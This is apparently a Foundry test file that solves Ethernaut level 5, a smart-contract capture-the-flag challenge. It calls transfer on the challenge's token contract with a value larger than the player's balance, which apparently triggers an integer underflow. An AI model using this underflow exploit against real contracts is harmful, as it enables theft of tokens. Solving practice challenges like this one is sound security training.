pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {EthernautTest} from "./EthernautTest.sol";

interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);

    function balanceOf(address _owner) external view returns (uint256);
}

contract Ethernaut05 is EthernautTest {
    constructor() EthernautTest(5) {}

    function solve() internal override(EthernautTest) {
        IToken(instance).transfer(address(0x0), 1 ether);
    }
}
